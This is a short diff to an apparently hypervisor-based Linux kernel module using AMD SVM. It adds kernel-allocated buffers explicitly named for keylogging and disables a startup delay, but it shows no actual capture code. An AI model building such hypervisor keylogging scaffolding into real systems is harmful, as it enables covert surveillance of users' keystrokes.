@@ -14,6 +14,8 @@ void * __global_Guest_Reg_Store;
 void * __global_VMCB_VA;
 phys_addr_t __global_VMCB_PA;
 phys_addr_t __global_VM_HSAVE_PA;
+uint64_t * __global_keylogger_counter;
+char * __global_keylogger_buffer;
 
 extern void VM_Setup_and_Run(void);
 
@@ -26,14 +28,16 @@ static int __init test_init(void)
 	enable_svm(); // Return 0 on success
 	init_vm_hsave_pa();
 	setup_apic_mapping(); // Just some APIC stuff
-
+	
+	__global_keylogger_counter = kzalloc(8, GFP_KERNEL);
+	__global_keylogger_buffer = kzalloc(128, GFP_KERNEL);
 	__global_Host_Reg_Store = kzalloc(128, GFP_KERNEL);  // only need like 128 bytes for now
 	__global_Guest_Reg_Store = kzalloc(128, GFP_KERNEL);  // only neeed like 128 bytes for now
 
 	// NOTE: do not use mdelay(), it causes Kernel Panic, idk why.
 	// mdelay busy waits, preventing other tasks from running
 	// msleep doesn't busy wait
-	msleep(3000);
+	//msleep(3000);
 
 	VM_Setup_and_Run();	
 
